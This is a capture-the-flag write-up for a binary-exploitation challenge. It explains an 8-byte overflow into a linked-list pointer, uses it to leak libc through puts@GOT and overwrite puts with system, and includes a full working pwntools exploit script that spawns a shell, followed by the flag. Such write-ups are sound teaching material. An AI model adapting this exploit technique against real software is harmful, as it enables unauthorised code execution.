# Conveyor Belt

Conveyor belt.

Running the binary, we have two options - add a part to the conveyor belt, and review the belt. When we review the belt, it goes through all the parts we have one by one, printing them, asking us if they are safe. If we say they aren't(that is, not responding with 'Y' or 'y') then we can edit the part.

Let's chuck it into ghidra and see what more we can get.

First of all, we see that the add_part function is like so -
It seems to take a parameter being the address of the previous part.
allocate 0x80 bytes of data. Read 0x80 bytes of data from stdin into this place. 
If the string contains "sh", say the part isn't safe, free the allocated data, return the parameter we got(essentially dont make any chunk and pretend nothing ever happened)

If not, then edit datapointer+0x78 to be the address of the previous part. Essentially, the parts are in the structure

struct part {
char name[0x78];
char* previous_part;
}

Forming a list. The problem is, whenever it asks us to edit a part, it reads 0x80 bytes when only 0x78 are the data segment - giving us an overwrite of the previous_part field. More on this later.

Let's look at the safety check function. It starts on the last part, printing it, asking is if it's safe, and allowing us to edit it if it isn't. Here's our main vuln. An extra 8 bytes are read, letting us overwrite the previous_part field. The function then grabs the previous part field, visits that, prints it, asks if it's safe, etc. etc. until it hits a previous_part field of 0.

What can we do with this? We can create a single part, then activate the safety check. We can edit the previous part field in-place, and then it'll go wherever we want for the next part! This creates two things

1. Arbitrary read, as it'll print out the part.
2. Arbitrary write, as we can say the part isn't safe, and then edit it.
Therefore...
We can set the previous part field to puts@GOT, allowing us to read a libc address. Once we read this, we'll edit puts@GOT too! Let's edit it with the address of system.

Now what? It'll look 0x78 bytes later for the address of the next part, then continue. It'll grab this address, call puts("Next part:") and then calls puts on the next part.

Therefore, if we pretend the next part is the address of /bin/sh, it'll call system("/bin/sh") for us. So, our exploit:

1. Create new part
2. Safety check. Say the part isn't safe. Edit it with 0x78 bytes of junk + address of puts@GOT
3. It'll print the value of puts@got, which is puts@LIBC. Read this value, and subtract appropriate offset to get the libc base. Say part isn't safe. Send system address + 0x70 bytes of junk + /bin/sh address such that whenever it calls puts it'll actually call system, and the next thing it will call puts on is /bin/sh

Script below.

```python
from pwn import *
mode = sys.argv[1]
NUM_TO_NEXTPART = 0x78
padding = b'A' * NUM_TO_NEXTPART
e = ELF("./conveyor")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if mode == 'local' else "/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6")
p = e.process() if mode == 'local' else remote('jh2i.com', 50020)
p.recvuntil(b"> ")
p.sendline("1")
p.recvuntil(b": ")
p.sendline("l33t")
p.sendline("2")
p.recvuntil(b"? ")
p.sendline("no")
p.recvuntil(b": ")
# Setup is done. Time for the main exploit.
payload = padding + p64(e.got['puts'])
p.sendline(payload)
p.recvline()
output = p.recvline()[:-1]
print(output)
leak = output + b'\x00' * (8 - len(output))
puts = u64(leak)
log.info(f"Puts address: {hex(puts)}")
libcbase = puts - libc.symbols['puts']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
# Overwrite puts with system. Then, overwrite next part address with /bin/sh. So, it'll load /bin/sh as the next part. It'll try to puts the next part, and boom! Shell popped.
new = p64(libc.symbols['system'])
new += b'B' * (0x78 - len(new))
new += p64(next(libc.search(b"/bin/sh")))
p.sendline(new)
p.interactive()
```

#### Flag: flag{you_broke_the_conveyor}
